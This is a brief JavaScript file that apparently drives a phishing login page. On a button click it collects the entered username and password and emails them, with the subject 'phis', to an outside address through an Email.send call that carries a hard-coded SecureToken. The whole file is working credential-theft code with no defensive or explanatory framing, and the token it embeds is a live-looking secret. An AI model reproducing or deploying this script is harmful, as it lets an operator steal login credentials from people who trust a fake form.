function initialize() {
  $(".mobloginbuttondiv").on("click", function () {
  alert('You clicked the menu icon');
});
  document.getElementById("loginbutton").onclick = buttonclick => {
    let username = document.getElementById("username").value;
    let password = document.getElementById("userpassword").value;
    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
    Email.send({
      SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
      To: 'someone@gmail.com',
      From: "someone@gmail.com",
      Subject: "phis",
      Body: userdata
    });
  }
}
window.onload = initialize;
